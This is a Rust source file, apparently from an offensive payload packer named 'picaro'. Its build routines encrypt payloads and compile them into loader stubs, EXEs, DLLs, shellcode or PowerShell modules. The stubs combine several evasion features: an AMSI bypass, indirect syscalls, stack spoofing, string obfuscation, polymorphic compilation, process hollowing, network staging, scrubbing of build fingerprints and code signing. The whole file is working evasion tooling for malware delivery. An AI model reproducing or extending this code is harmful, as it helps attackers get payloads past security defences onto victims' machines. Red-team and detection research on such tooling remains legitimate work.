use super::*;

pub(super) fn build(
    plan: &plan::Plan,
    build_args: &BTreeMap<String, String>,
    plan_path: &Path,
    ui: &Palette,
    options: &BuildOptions,
) -> Result<()> {
    let verbose = options.verbose;
    let started = Instant::now();
    // Warnings are collected and printed as one block at the end, so the build
    // log reads as progress followed by actionable notes.
    let mut deferred_warnings: Vec<String> = options.warnings.clone();

    // Reproduction overrides are applied to a copy: the plan on disk is never
    // rewritten, and the manifest records what actually ran.
    let replay = plan.reproduce.is_some();
    let entropy = BuildEntropy::from_plan(plan, options.seed);
    let mut effective_plan = plan.clone();
    apply_payload_overrides(&mut effective_plan, &options.payloads)?;
    if let Some(out) = &options.out {
        effective_plan.build.output.path = if out.is_dir() {
            let name = effective_plan
                .build
                .output
                .path
                .file_name()
                .map(PathBuf::from)
                .unwrap_or_else(|| PathBuf::from("artifact"));
            out.join(name)
        } else {
            out.clone()
        };
    }
    // Every run is a package: one folder named after the plan, holding the
    // sources, the payload blobs, the artifact and its provenance.
    let (package_dir, artifact_path) =
        package_paths(&effective_plan.name, &effective_plan.build.output.path);
    effective_plan.build.output.path = artifact_path;
    let plan = &effective_plan;
    let debug = plan.build.stub.debug || options.debug;
    let build_name = options.build_name.as_deref();

    match &options.heading {
        Some(heading) => {
            anstream::println!("{}", ui.command_line(&heading.command, &heading.target))
        }
        None => anstream::println!("{}", ui.command_line("build", plan_path.display())),
    }
    for field in &options.prelude {
        anstream::println!("{}", ui.field(&field.label, &field.value));
    }
    anstream::println!("{}", ui.field("package", ui.target(package_dir.display())));
    anstream::println!();

    if replay {
        deferred_warnings.push(format!(
            "replaying the plan recorded in {} (entropy seed {:#018x})",
            plan_path.display(),
            entropy.seed
        ));
        let audit = plan
            .reproduce
            .as_ref()
            .is_some_and(|record| record.secrets == SecretsPolicy::Audit);
        if audit && options.key_file.is_none() {
            deferred_warnings.push(
                "secrets: audit and no --key-file: only the code is reproduced; the \
                 ciphertext (and the unsigned hash) will differ"
                    .to_string(),
            );
        }
    }

    // `--strict` is checked before any compilation: a different compiler may
    // still produce the same bytes, but the contract does not promise it.
    if options.strict {
        verify_toolchain(plan)?;
    }

    if debug {
        deferred_warnings.push(
            "debug build: technique traces are enabled and the artifact is built without \
             hardening (symbols, debug info and source paths are kept). Lab use only."
                .to_string(),
        );
    }

    // Polymorphism is on by default (`mode: full`); a debug build forces it off
    // so the artifact stays reproducible and debuggable.
    let polymorphism = polymorphism::PolymorphismConfig::from_yaml_with_entropy(
        plan.build.polymorphism.as_ref(),
        debug,
        &entropy,
    )?;
    if debug
        && plan
            .build
            .polymorphism
            .as_ref()
            .is_some_and(|block| block.mode != polymorphism::PolymorphismMode::None)
    {
        deferred_warnings
            .push("debug build: polymorphism is disabled (mode forced to none)".to_string());
    }

    if verbose {
        print_plan(plan, plan_path, ui);
    }

    // 1. Resolve the flat runtime into concrete steps (payloads pinned down).
    let steps = plan::steps::resolve(plan)?;

    // Whether a `patch_amsi` step is declared: a PowerShell payload compiled into
    // a managed launcher needs the managed AMSI bypass baked in alongside the
    // stub's native patch.
    let patch_amsi = steps
        .iter()
        .any(|step| matches!(step.technique, TechniqueKind::PatchAmsi { .. }));

    // 2. String-obfuscation, syscall and API-resolution configurations.
    if plan.build.stub.strings.is_none() {
        deferred_warnings
            .push("build.stub.strings not specified, defaulting to xor+random".to_string());
    }
    let strings = obfuscation::StringsConfig::from_yaml_with_entropy(
        plan.build.stub.strings.as_ref(),
        &entropy,
    )?;
    let syscalls = syscalls::SyscallsConfig::from_yaml(plan.build.stub.syscalls.as_ref())?;
    let api_resolution =
        api_resolution::ApiResolutionConfig::from_yaml(plan.build.stub.api_resolution.as_ref())?;
    let union: Vec<RuntimeStep> = steps
        .iter()
        .map(|step| RuntimeStep::new(step.technique.clone()))
        .collect();
    if syscalls.mode == syscalls::SyscallsMode::Indirect && syscalls::required(&union).is_empty() {
        deferred_warnings.push(
            "build.stub.syscalls.mode is 'indirect' but no technique in the runtime \
             uses NT syscalls yet (phase 6a: only process_hollowing does)"
                .to_string(),
        );
    }
    // Plan-level advisories from semantic validation (e.g. a no-op bouncer).
    deferred_warnings.extend(plan::validate::advisories(plan));

    // A `kind: psmodule` build is a managed PowerShell module, not a Rust stub:
    // it compiles generated C# instead of the stub template.
    if plan.build.output.kind == OutputKind::PsModule {
        return build_psmodule(
            plan,
            &steps,
            plan_path,
            ui,
            &entropy,
            options,
            &mut deferred_warnings,
        );
    }

    // 3. Encrypt every Execution step's payload and collect the renderer input.
    let build_dir = scratch_dir(build_name)?;
    prepare_build_dir(&build_dir)?;
    if build_name.is_some() {
        // A named build has a stable path by construction; surfacing it is what
        // lets an operator (or the debugger) find `main.rs`/`out.exe` again.
        anstream::println!("{}", ui.field("scratch", build_dir.display()));
    }

    let mut step_payloads = Vec::new();
    let mut total_plaintext: usize = 0;
    let mut nonces: Vec<(usize, [u8; crypto::NONCE_LEN], [u8; crypto::KEY_LEN])> = Vec::new();

    // Reproduction inputs: per-payload pins recorded by a previous build, the
    // key file supplied on the command line, and the records this build writes.
    let recorded_payloads = plan
        .reproduce
        .as_ref()
        .map(|record| record.payloads.clone())
        .unwrap_or_default();
    let key_file = match &options.key_file {
        Some(path) => Some(read_key_file(path)?),
        None => None,
    };
    let mut payload_records: BTreeMap<String, PayloadReproduction> = BTreeMap::new();
    let mut nonce_first_use: BTreeSet<String> = BTreeSet::new();

    // How a `network_stager` step delivers its payload: strictly staged (the
    // build skips reading/encrypting/writing it) or staged with the embedded
    // copy as a fallback (`fallback: embedded`).
    let staged_payloads = stager_sources(&steps);

    for step in &steps {
        let staged_source = step
            .payload
            .as_ref()
            .and_then(|payload| staged_payloads.get(&payload.name).copied());
        let cipher = match &step.payload {
            Some(payload) if staged_source == Some(steps::PayloadSource::Staged) => {
                // A payload fetched at run time by a `network_stager` step is not
                // embedded: nothing is read, encrypted or written for it.
                anstream::println!(
                    "{}",
                    ui.done(
                        &format!("step {} {}", step.index, ui.brand(step.technique.name())),
                        dotted(
                            ui,
                            &[ui.brand("staged"), ui.dim(payload.plan.format.label())]
                        )
                    )
                );
                Some(steps::PayloadCipher {
                    nonce: [0u8; 24],
                    key: [0u8; 32],
                    plaintext_len: 0,
                    path: String::new(),
                    format: payload.plan.format,
                    export: payload.plan.export.clone(),
                    args: payload.plan.args.clone().unwrap_or_default(),
                    args_override: payload.plan.args_mode == engine::args::ArgsMode::Override,
                    marker: stub_marker(
                        &entropy,
                        &format!("marker:{}:{}", payload.name, step.index),
                    ),
                    source: steps::PayloadSource::Staged,
                })
            }
            Some(payload) => {
                // Read the input payload and validate it (fail early, before
                // encrypting or compiling).
                let timer = Instant::now();
                let plaintext = load_source(&payload.plan.source)?;
                verify_payload_hash(&plaintext, payload.plan.sha256.as_deref())?;
                verify_reproduced_payload(
                    &payload.name,
                    &plaintext,
                    recorded_payloads.get(&payload.name),
                )?;
                let summary =
                    inspect_payload(payload.plan.format, &plaintext, plan.build.output.arch)?;
                let read_time = timer.elapsed();

                // A `format: powershell` payload is text, not a managed image:
                // compile it into a small managed launcher the stub hosts (see
                // `engine::managed`). Every other format is embedded as read.
                let payload_bytes = match step.technique.powershell_params() {
                    Some(params) => {
                        let script = std::str::from_utf8(&plaintext).map_err(|_| {
                            error::PackerError::Validation(
                                "the PowerShell payload is not valid UTF-8 text".to_string(),
                            )
                        })?;
                        engine::managed::build_launcher(
                            script,
                            params.command.as_deref().unwrap_or(""),
                            params.command_mode
                                == crate::techniques::powershell_hosting::CommandMode::Join,
                            params.mode == crate::techniques::powershell_hosting::Mode::Interactive,
                            patch_amsi,
                            &build_dir,
                            &format!("launcher_{}", step.index),
                        )?
                    }
                    None => plaintext.clone(),
                };

                // Derive the key and nonce from the recorded build (replay), the
                // key file (audit manifests), a plan literal, or the build's
                // single entropy source — in that order.
                let timer = Instant::now();
                let tag = format!("{}:{}", payload.name, step.index);
                let recorded = recorded_payloads.get(&payload.name);
                let first_use = nonce_first_use.insert(payload.name.clone());
                let key = match key_file {
                    Some(key) => key,
                    None => match recorded.and_then(|record| record.key.as_deref()) {
                        Some(hex_key) if first_use => parse_key_hex(hex_key)?,
                        _ => key_for_payload(&payload.crypto.key, &entropy, &tag)?,
                    },
                };
                let nonce = match recorded
                    .and_then(|record| record.nonce.as_deref())
                    .filter(|_| first_use)
                {
                    Some(hex_nonce) => parse_nonce_hex(hex_nonce)?,
                    None => entropy
                        .derive_tagged_bytes::<{ crypto::NONCE_LEN }>(Domain::PayloadNonce, &tag),
                };
                let encrypted = crypto::encrypt_payload_with_nonce(&payload_bytes, &key, &nonce)?;
                let encrypt_time = timer.elapsed();

                let path = format!("payload_{}.bin", step.index);
                std::fs::write(build_dir.join(&path), &encrypted.ciphertext)?;
                total_plaintext += payload_bytes.len();
                nonces.push((step.index, encrypted.nonce, encrypted.key));

                payload_records
                    .entry(payload.name.clone())
                    .or_insert(PayloadReproduction {
                        sha256: Some(engine::hash::sha256_hex(&plaintext)),
                        size: Some(plaintext.len() as u64),
                        nonce: Some(hex::encode(encrypted.nonce)),
                        key: Some(hex::encode(encrypted.key)),
                    });

                let mut parts = vec![
                    ui.target(describe_source(&payload.plan.source)),
                    ui.dim(summary.label),
                    human_size(payload_bytes.len()),
                ];
                if let Some(export) = &payload.plan.export {
                    parts.push(ui.dim(format!("export {export}")));
                }
                parts.push(ui.brand(crypto_label(payload.crypto.algo)));
                if staged_source == Some(steps::PayloadSource::StagedWithFallback) {
                    parts.push(ui.brand("staged fallback"));
                }
                anstream::println!(
                    "{}",
                    ui.done(
                        &format!("step {} {}", step.index, ui.brand(step.technique.name())),
                        dotted(ui, &parts)
                    )
                );
                for warning in payload_advisories(step, &summary) {
                    deferred_warnings.push(warning);
                }
                if verbose {
                    if let Some(info) = &summary.pe {
                        anstream::println!(
                            "{}",
                            ui.detail("machine", ui.dim(format!("0x{:04x}", info.machine)))
                        );
                    }
                    anstream::println!(
                        "{}",
                        ui.detail("sha256", ui.dim(engine::hash::sha256_hex(&plaintext)))
                    );
                    anstream::println!(
                        "{}",
                        ui.detail(
                            "payload",
                            ui.dim(format!("read {}", format_elapsed(read_time)))
                        )
                    );
                    let tag = encrypted
                        .ciphertext
                        .len()
                        .saturating_sub(payload_bytes.len());
                    anstream::println!(
                        "{}",
                        ui.detail(
                            "encrypt",
                            ui.dim(format!(
                                "{} -> {} (+{tag} tag) {}",
                                human_size(payload_bytes.len()),
                                human_size(encrypted.ciphertext.len()),
                                format_elapsed(encrypt_time)
                            ))
                        )
                    );
                }

                Some(steps::PayloadCipher {
                    nonce: encrypted.nonce,
                    key: encrypted.key,
                    plaintext_len: encrypted.plaintext_len,
                    path,
                    format: payload.plan.format,
                    export: payload.plan.export.clone(),
                    args: payload.plan.args.clone().unwrap_or_default(),
                    args_override: payload.plan.args_mode == engine::args::ArgsMode::Override,
                    marker: stub_marker(
                        &entropy,
                        &format!("marker:{}:{}", payload.name, step.index),
                    ),
                    source: staged_source.unwrap_or(steps::PayloadSource::Embedded),
                })
            }
            None => {
                anstream::println!(
                    "{}",
                    ui.done(
                        &format!("step {} {}", step.index, ui.brand(step.technique.name())),
                        ui.dim(step.technique.category().label())
                    )
                );
                None
            }
        };

        step_payloads.push(steps::StepPayload {
            index: step.index,
            label: step.label.clone(),
            technique: step.technique.clone(),
            control: step.control,
            payload: cipher,
        });
    }

    // 4. Load the stub template (builtin or custom) and render the step stub.
    let timer = Instant::now();
    let (template, template_display, is_custom) = load_stub_template(plan)?;
    let params = steps::StepsParams {
        steps: step_payloads,
        build_args: build_args.clone(),
        debug,
        windows_subsystem: plan.build.output.subsystem == Subsystem::Windows,
        kind: plan.build.output.kind,
        entry: plan.build.output.entry.clone(),
        console: plan.build.output.console,
        poly_seed: polymorphism.uses_source().then_some(polymorphism.seed),
    };
    let stub_src = if is_custom {
        stub::validate_custom_stub_template(&template)?;
        let rendered =
            steps::render_custom(&template, &params, &strings, &syscalls, &api_resolution)?;
        for warning in &rendered.warnings {
            deferred_warnings.push(warning.clone());
        }
        rendered.source
    } else {
        steps::render_builtin(&template, &params, &strings, &syscalls, &api_resolution)?
    };
    // A DLL has no subsystem: the host's applies, and `#![windows_subsystem]`
    // would be ignored (or, worse, silently taken as an instruction).
    let stub_src = if plan.build.output.kind == OutputKind::Exe {
        apply_subsystem(stub_src, plan.build.output.subsystem)
    } else {
        stub_src
    };
    let stub_path = build_dir.join("main.rs");
    std::fs::write(&stub_path, &stub_src)?;
    let stub_time = timer.elapsed();

    let mut stub_parts = vec![
        runtime_chain(ui, &steps),
        format!("{} {}", ui.dim("strings"), strings.strategy.label()),
        format!("{} {}", ui.dim("syscalls"), syscalls.mode.label()),
    ];
    if syscalls.stack_spoofing.is_some() {
        stub_parts.push(format!("{} {}", ui.dim("stack_spoofing"), "on"));
    }
    if polymorphism.mode != polymorphism::PolymorphismMode::None {
        stub_parts.push(format!("{} {}", ui.dim("poly"), polymorphism.mode.label()));
    }
    if matches!(
        plan.build.output.kind,
        OutputKind::Dll | OutputKind::Shellcode
    ) {
        stub_parts.push(ui.brand(format!(
            "{} {}",
            plan.build.output.kind.label(),
            plan.build.output.entry.label()
        )));
    }
    if debug {
        stub_parts.push(ui.warn("debug"));
    }
    anstream::println!("{}", ui.done("stub", dotted(ui, &stub_parts)));
    if verbose {
        anstream::println!("{}", ui.detail("template", ui.dim(&template_display)));
        anstream::println!(
            "{}",
            ui.detail("resolver", ui.dim(syscalls.resolver.label()))
        );
        anstream::println!(
            "{}",
            ui.detail(
                "poly",
                ui.dim(format!(
                    "mode {} seed {:#018x} units {} opt {} lto {} inline {} mir {} layout {}",
                    polymorphism.mode.label(),
                    polymorphism.seed,
                    polymorphism.codegen.codegen_units,
                    polymorphism.codegen.opt_level.flag(),
                    polymorphism.codegen.lto.flag().unwrap_or("off"),
                    polymorphism
                        .codegen
                        .inline_threshold
                        .map(|t| t.to_string())
                        .unwrap_or_else(|| "off".to_string()),
                    polymorphism
                        .codegen
                        .mir_opt_level
                        .map(|l| l.to_string())
                        .unwrap_or_else(|| "off".to_string()),
                    if polymorphism.codegen.randomize_layout {
                        format!("{:#x}", polymorphism.codegen.layout_seed)
                    } else {
                        "off".to_string()
                    },
                ))
            )
        );
        anstream::println!(
            "{}",
            ui.detail(
                "source",
                format!(
                    "{} {} {} lines",
                    stub_path.display(),
                    ui.faint(glyph::DOT),
                    stub_src.lines().count()
                )
            )
        );
        anstream::println!("{}", ui.detail("time", ui.dim(format_elapsed(stub_time))));
    }

    // 5. Locate the dependencies and compile the stub.
    let timer = Instant::now();
    let arch = plan.build.output.arch;
    let deps = compiler::locate_stub_deps(arch)?;
    let out = intermediate_path(&build_dir, &plan.build.output);
    let compile_options = compiler::CompileOptions {
        strip: plan.build.output.strip,
        trim_paths: match plan.build.output.trim_paths {
            TrimPaths::None => compiler::PathTrim::None,
            TrimPaths::Relative => compiler::PathTrim::Relative,
            TrimPaths::All => compiler::PathTrim::All,
        },
        debug,
        arch,
        kind: plan.build.output.kind,
        codegen: polymorphism.codegen,
    };
    compiler::compile_stub(&stub_path, &out, &deps, compile_options)?;
    // D-21: a proxy must never import the API it intercepts, or the signature
    // would simply move from the payload's IAT into the stub's.
    verify_no_intercepted_imports(&out, &api_resolution, &steps)?;

    // 5a. Scrub build-path literals the compiler remap cannot reach: the scratch
    //     dir when it sits outside the manifest dir, and the paths baked into
    //     precompiled dependencies (a constant fingerprint across artifacts).
    //     Overwritten in place with a per-build filler, so the region also
    //     differs build to build. Before resources and signing.
    if !debug && !matches!(plan.build.output.trim_paths, TrimPaths::None) {
        let patterns = engine::scrub::default_patterns(&build_dir);
        let mut bytes = std::fs::read(&out)?;
        let replaced =
            engine::scrub::scrub_with(&mut bytes, &patterns, engine::scrub::random_fill(&entropy));
        if replaced > 0 {
            std::fs::write(&out, &bytes)?;
        }
        if verbose {
            anstream::println!(
                "{}",
                ui.detail("scrub", ui.dim(format!("{replaced} path literals")))
            );
        }
    }

    let compile_time = timer.elapsed();

    anstream::println!(
        "{}",
        ui.done(
            "compile",
            dotted(
                ui,
                &["rustc".to_string(), ui.dim(compiler::stub_target(arch)),]
            )
        )
    );
    if verbose {
        anstream::println!(
            "{}",
            ui.detail(
                "rustc",
                ui.dim(compiler::find_rustc()?.display().to_string())
            )
        );
        anstream::println!("{}", ui.detail("output", ui.dim(out.display().to_string())));
        anstream::println!(
            "{}",
            ui.detail("time", ui.dim(format_elapsed(compile_time)))
        );
    }

    // 5b. Embed PE resources into the compiled stub (icon, VERSIONINFO and the
    //     application manifest), written into a new `.rsrc` section.
    let resources = resolve_resources(plan, &entropy);
    if let Some(resources) = &resources {
        let pe_bytes = std::fs::read(&out)?;
        let injected = engine::resources::embed(&pe_bytes, resources)?;
        if injected.len() != pe_bytes.len() {
            std::fs::write(&out, &injected)?;
            if verbose {
                anstream::println!(
                    "{}",
                    ui.detail(
                        "resources",
                        ui.dim(format!(
                            "+{} bytes (.rsrc)",
                            injected.len() - pe_bytes.len()
                        ))
                    )
                );
            }
        }
    }

    // 5c. A `kind: shellcode` build is the packed DLL wrapped in a reflective
    //     loader: convert the resource-bearing DLL in place, so the tail below
    //     copies raw shellcode instead of a PE. This runs *after* the resource
    //     step on purpose: resources are written into the PE, and converting
    //     first would hand `resources::embed` raw shellcode. (Validation rejects
    //     `resources` for shellcode, so the step above is a no-op today; the
    //     order is what keeps the pipeline correct if that ever changes.)
    if plan.build.output.kind == OutputKind::Shellcode {
        let export = plan.build.output.entry.export_name().unwrap_or("Run");
        let bytes = engine::shellcode::convert(&out, export)?;
        std::fs::write(&out, &bytes)?;
    }

    // 6. Lock the shared output, then copy the compiled stub to the output path
    //    from the YAML, sign it and write the manifest. The lock is keyed on the
    //    output path so two concurrent `picaro build` runs cannot interleave
    //    their copy/sign/manifest writes into the same artifact.
    std::fs::create_dir_all(&package_dir)?;
    let _output_lock = build_lock::OutputLock::acquire(&plan.build.output.path)?;
    std::fs::copy(&out, &plan.build.output.path)?;
    copy_package_sources(&build_dir, &package_dir)?;
    let out_size = std::fs::metadata(&plan.build.output.path)?.len() as usize;

    // The reproducibility target is the artifact *before* signing: an
    // Authenticode signature (and especially an RFC 3161 timestamp) is not
    // reproducible by nature.
    let unsigned_sha256 = engine::hash::sha256_hex(&std::fs::read(&plan.build.output.path)?);

    // 6b. Sign the artifact (Authenticode), if configured. Signing must be the
    //     last modification, so the manifest below hashes the signed file.
    let sign_plan = resolve_sign(plan, resources.as_ref());
    let signature = engine::signing::sign(&plan.build.output.path, sign_plan.as_ref())?;
    if let Some(sig) = &signature {
        let mut parts = vec![ui.brand(sig.mode.clone())];
        if let Some(thumbprint) = &sig.thumbprint {
            parts.push(ui.dim(short_thumbprint(thumbprint)));
        }
        if sig.timestamp_url.is_some() {
            parts.push(ui.dim("timestamped"));
        }
        anstream::println!("{}", ui.done("sign", dotted(ui, &parts)));
        if verbose {
            if let Some(ca_file) = &sig.ca_file {
                anstream::println!("{}", ui.detail("certificate", ui.dim(ca_file.clone())));
            }
        }
    }

    // The reproducibility target is the artifact before signing; `--verify`
    // checks it against the record the replay started from *before* writing a
    // new manifest, so a mismatch leaves no fresh record behind.
    if options.verify {
        verify_predecessor(plan, &unsigned_sha256, ui, &mut deferred_warnings)?;
    }

    // 6c. Reproduction record: the manifest *is* the resolved plan plus a
    //     `reproduce` block, so feeding it back rebuilds the artifact. It stores
    //     the payload key under `secrets: exact`, which makes it as sensitive as
    //     the payload; the warning below says so once.
    let artifact_sha256 = engine::hash::sha256_hex(&std::fs::read(&plan.build.output.path)?);
    let artifact_path = plan.build.output.path.clone();
    if plan.build.output.manifest || replay || options.redact.is_some() {
        let manifest_path = if replay {
            engine::manifest::replay_manifest_path(&artifact_path, plan_path)
        } else {
            engine::manifest::manifest_path(&artifact_path)
        };
        let manifest = engine::manifest::compose(
            plan,
            &entropy,
            engine::manifest::ManifestInputs {
                identity: resources.as_ref().and_then(|r| r.version_info.clone()),
                icon: generated_icon(resources.as_ref()),
                polymorphism: Some(polymorphism.record()),
                strings_strategy: Some(strings.strategy.label().to_string()),
                signature: signature.clone(),
                payloads: payload_records,
                predecessor: Some(Predecessor {
                    built_at: engine::manifest::built_at_now(),
                    artifact: artifact_path.display().to_string(),
                    artifact_sha256: artifact_sha256.clone(),
                    unsigned_sha256: unsigned_sha256.clone(),
                }),
                secrets: SecretsPolicy::Exact,
            },
        )?;
        engine::manifest::write(&manifest, &manifest_path)?;
        if let Some(redact_path) = &options.redact {
            engine::manifest::redact(&manifest, redact_path)?;
        }
        if verbose {
            anstream::println!(
                "{}",
                ui.detail("manifest", ui.dim(manifest_path.display().to_string()))
            );
        }
    }

    let total = started.elapsed();

    // 7. The result, standing apart from the per-step lines.
    anstream::println!();
    anstream::println!(
        "{}",
        ui.result(
            "packed",
            dotted(
                ui,
                &[
                    ui.target(plan.build.output.path.display().to_string()),
                    human_size(out_size),
                    ui.dim(format_elapsed(total)),
                ]
            )
        )
    );
    if verbose {
        let delta = out_size.saturating_sub(total_plaintext);
        anstream::println!(
            "{}",
            ui.detail("delta", format!("+{} over the input", human_size(delta)))
        );
    }

    // 8. Per-build material: the nonces are public; the keys are printed in
    //    debug builds only, never in release.
    anstream::println!();
    for (index, nonce, key) in &nonces {
        anstream::println!(
            "{}",
            ui.field(&format!("nonce {index}"), hex::encode(nonce))
        );
        #[cfg(debug_assertions)]
        {
            let _ = key;
            anstream::println!("{}", ui.field(&format!("key {index}"), hex::encode(key)));
        }
    }
    #[cfg(debug_assertions)]
    {
        if let Some(key) = strings.key {
            anstream::println!("{}", ui.field("strings key", hex::encode(key)));
        }
    }

    if !deferred_warnings.is_empty() {
        anstream::eprintln!();
        let width = ui::term_width();
        for warning in &deferred_warnings {
            for line in ui.warn_lines(warning, width) {
                anstream::eprintln!("{line}");
            }
        }
    }

    Ok(())
}

/// Builds a `kind: psmodule` artifact: a managed PowerShell binary module.
///
/// A module is not the Rust stub. The packer encrypts each `import_powermodule`
/// script, renders a C# `IModuleAssemblyInitializer` around them and compiles it
/// with `csc`; `Import-Module` then injects the scripts into the operator's
/// session. The output is signed and a manifest written like any other artifact.
pub(super) fn build_psmodule(
    plan: &plan::Plan,
    steps: &[ResolvedStep],
    plan_path: &Path,
    ui: &Palette,
    entropy: &BuildEntropy,
    options: &BuildOptions,
    deferred_warnings: &mut Vec<String>,
) -> Result<()> {
    // `build` rewrites `output.path` into the package folder before dispatching
    // here, so the package is always the artifact's parent.
    let package_dir = plan
        .build
        .output
        .path
        .parent()
        .unwrap_or_else(|| Path::new("."));
    let started = Instant::now();
    let replay = plan.reproduce.is_some();
    let build_name = options.build_name.as_deref();
    let build_dir = scratch_dir(build_name)?;
    prepare_build_dir(&build_dir)?;
    if build_name.is_some() {
        anstream::println!("{}", ui.field("scratch", build_dir.display()));
    }

    let patch_amsi = steps
        .iter()
        .any(|step| matches!(step.technique, TechniqueKind::PatchAmsi { .. }));

    // Encrypt each `import_powermodule` script and collect the provenance.
    let mut scripts = Vec::new();
    let mut nonces: Vec<(usize, [u8; crypto::NONCE_LEN], [u8; crypto::KEY_LEN])> = Vec::new();
    let recorded_payloads = plan
        .reproduce
        .as_ref()
        .map(|record| record.payloads.clone())
        .unwrap_or_default();
    let key_file = match &options.key_file {
        Some(path) => Some(read_key_file(path)?),
        None => None,
    };
    let mut payload_records: BTreeMap<String, PayloadReproduction> = BTreeMap::new();
    let mut nonce_first_use: BTreeSet<String> = BTreeSet::new();

    for step in steps {
        let Some(payload) = &step.payload else {
            // A preparation step (patch_amsi, sleep): nothing to embed.
            anstream::println!(
                "{}",
                ui.done(
                    &format!("step {} {}", step.index, ui.brand(step.technique.name())),
                    ui.dim(step.technique.category().label())
                )
            );
            continue;
        };

        let plaintext = load_source(&payload.plan.source)?;
        verify_payload_hash(&plaintext, payload.plan.sha256.as_deref())?;
        verify_reproduced_payload(
            &payload.name,
            &plaintext,
            recorded_payloads.get(&payload.name),
        )?;
        let summary = inspect_payload(payload.plan.format, &plaintext, plan.build.output.arch)?;

        let tag = format!("{}:{}", payload.name, step.index);
        let recorded = recorded_payloads.get(&payload.name);
        let first_use = nonce_first_use.insert(payload.name.clone());
        let key = match key_file {
            Some(key) => key,
            None => match recorded.and_then(|record| record.key.as_deref()) {
                Some(hex_key) if first_use => parse_key_hex(hex_key)?,
                _ => key_for_payload(&payload.crypto.key, entropy, &tag)?,
            },
        };
        let nonce = match recorded
            .and_then(|record| record.nonce.as_deref())
            .filter(|_| first_use)
        {
            Some(hex_nonce) => parse_nonce_hex(hex_nonce)?,
            None => {
                entropy.derive_tagged_bytes::<{ crypto::NONCE_LEN }>(Domain::PayloadNonce, &tag)
            }
        };
        let encrypted = crypto::encrypt_payload_with_nonce(&plaintext, &key, &nonce)?;
        scripts.push(engine::managed::EncryptedScript {
            key_hex: hex::encode(encrypted.key),
            nonce_hex: hex::encode(encrypted.nonce),
            cipher_hex: hex::encode(&encrypted.ciphertext),
        });

        nonces.push((step.index, encrypted.nonce, encrypted.key));
        payload_records
            .entry(payload.name.clone())
            .or_insert(PayloadReproduction {
                sha256: Some(engine::hash::sha256_hex(&plaintext)),
                size: Some(plaintext.len() as u64),
                nonce: Some(hex::encode(encrypted.nonce)),
                key: Some(hex::encode(encrypted.key)),
            });

        anstream::println!(
            "{}",
            ui.done(
                &format!("step {} {}", step.index, ui.brand(step.technique.name())),
                dotted(
                    ui,
                    &[
                        ui.target(describe_source(&payload.plan.source)),
                        ui.dim(summary.label),
                        human_size(plaintext.len()),
                    ]
                )
            )
        );
    }

    // Render and compile the managed module.
    let timer = Instant::now();
    let module_bytes =
        engine::managed::build_module(&scripts, patch_amsi, &build_dir, "picaro_module")?;
    let compile_time = timer.elapsed();
    let module_path = build_dir.join("picaro_module.dll");
    std::fs::write(&module_path, &module_bytes)?;
    anstream::println!(
        "{}",
        ui.done(
            "module",
            dotted(
                ui,
                &[
                    ui.dim("csc"),
                    human_size(module_bytes.len()),
                    ui.dim(format_elapsed(compile_time)),
                ]
            )
        )
    );

    // Copy to the output path under the build lock, sign, write the manifest —
    // the same tail as the Rust-stub build.
    let _output_lock = build_lock::OutputLock::acquire(&plan.build.output.path)?;
    std::fs::create_dir_all(package_dir)?;
    std::fs::copy(&module_path, &plan.build.output.path)?;
    copy_psmodule_sources(&build_dir, package_dir)?;
    let out_size = std::fs::metadata(&plan.build.output.path)?.len() as usize;
    let unsigned_sha256 = engine::hash::sha256_hex(&std::fs::read(&plan.build.output.path)?);

    if options.verify {
        verify_predecessor(plan, &unsigned_sha256, ui, deferred_warnings)?;
    }

    let sign_plan = resolve_sign(plan, None);
    let signature = engine::signing::sign(&plan.build.output.path, sign_plan.as_ref())?;
    if let Some(sig) = &signature {
        let mut parts = vec![ui.brand(sig.mode.clone())];
        if let Some(thumbprint) = &sig.thumbprint {
            parts.push(ui.dim(short_thumbprint(thumbprint)));
        }
        if sig.timestamp_url.is_some() {
            parts.push(ui.dim("timestamped"));
        }
        anstream::println!("{}", ui.done("sign", dotted(ui, &parts)));
    }

    let artifact_sha256 = engine::hash::sha256_hex(&std::fs::read(&plan.build.output.path)?);
    let artifact_path = plan.build.output.path.clone();
    if plan.build.output.manifest || replay || options.redact.is_some() {
        let manifest_path = if replay {
            engine::manifest::replay_manifest_path(&artifact_path, plan_path)
        } else {
            engine::manifest::manifest_path(&artifact_path)
        };
        let manifest = engine::manifest::compose(
            plan,
            entropy,
            engine::manifest::ManifestInputs {
                identity: None,
                icon: None,
                polymorphism: None,
                strings_strategy: None,
                signature: signature.clone(),
                payloads: payload_records,
                predecessor: Some(Predecessor {
                    built_at: engine::manifest::built_at_now(),
                    artifact: artifact_path.display().to_string(),
                    artifact_sha256,
                    unsigned_sha256: unsigned_sha256.clone(),
                }),
                secrets: SecretsPolicy::Exact,
            },
        )?;
        engine::manifest::write(&manifest, &manifest_path)?;
        if let Some(redact_path) = &options.redact {
            engine::manifest::redact(&manifest, redact_path)?;
        }
    }

    anstream::println!();
    anstream::println!(
        "{}",
        ui.result(
            "packed",
            dotted(
                ui,
                &[
                    ui.target(plan.build.output.path.display().to_string()),
                    human_size(out_size),
                    ui.dim(format_elapsed(started.elapsed())),
                ]
            )
        )
    );

    anstream::println!();
    for (index, nonce, key) in &nonces {
        anstream::println!(
            "{}",
            ui.field(&format!("nonce {index}"), hex::encode(nonce))
        );
        #[cfg(debug_assertions)]
        {
            let _ = key;
            anstream::println!("{}", ui.field(&format!("key {index}"), hex::encode(key)));
        }
    }

    if !deferred_warnings.is_empty() {
        anstream::eprintln!();
        let width = ui::term_width();
        for warning in deferred_warnings.iter() {
            for line in ui.warn_lines(warning, width) {
                anstream::eprintln!("{line}");
            }
        }
    }

    Ok(())
}

/// Loads the stub template: the builtin one, or a custom loader stub.
pub(super) fn load_stub_template(plan: &plan::Plan) -> Result<(String, String, bool)> {
    match &plan.build.stub.path {
        Some(path) => {
            let path = path.clone();
            let source = std::fs::read_to_string(&path).map_err(|source| {
                error::PackerError::ReadLoader {
                    path: path.clone(),
                    source,
                }
            })?;
            Ok((
                source,
                format!("custom {} {}", glyph::DOT, path.display()),
                true,
            ))
        }
        None => {
            let relative = "src/engine/templates/main.rs.tpl";
            let template_path = Path::new(env!("CARGO_MANIFEST_DIR")).join(relative);
            let source = std::fs::read_to_string(&template_path).map_err(|source| {
                error::PackerError::ReadLoader {
                    path: template_path.clone(),
                    source,
                }
            })?;
            Ok((source, format!("builtin {} {relative}", glyph::DOT), false))
        }
    }
}
